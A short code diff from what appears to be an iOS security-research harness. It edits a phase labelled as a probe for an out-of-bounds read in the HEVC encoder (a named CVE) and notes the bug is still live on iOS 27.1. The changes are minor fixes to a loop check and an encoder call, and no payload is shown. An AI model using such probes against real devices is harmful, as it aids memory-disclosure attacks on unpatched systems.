@@ -23837,7 +23837,7 @@ new_modes:
          * Fixed in iOS 27.2 — LIVE on our iOS 27.1.
          * ============================================================ */
 
-        if (r229_round == 229) {
+        if (rounds == 229) {
             rlog("\n=== Phase 22: CVE-2026-112466 MCTF OOB Read Probe ===\n");
 
             /* ---- 22a: Enumerate HEVC encoder properties ---- */
@@ -24110,7 +24110,7 @@ new_modes:
                             __block int out_status = 0;
 
                             st = VTCompressionSessionEncodeFrameWithOutputHandler(
-                                enc, pxbuf, pts, dur, NULL,
+                                enc, pxbuf, pts, dur, NULL, NULL,
                                 ^(OSStatus ost,
                                   VTEncodeInfoFlags flags,
                                   CMSampleBufferRef sbuf) {
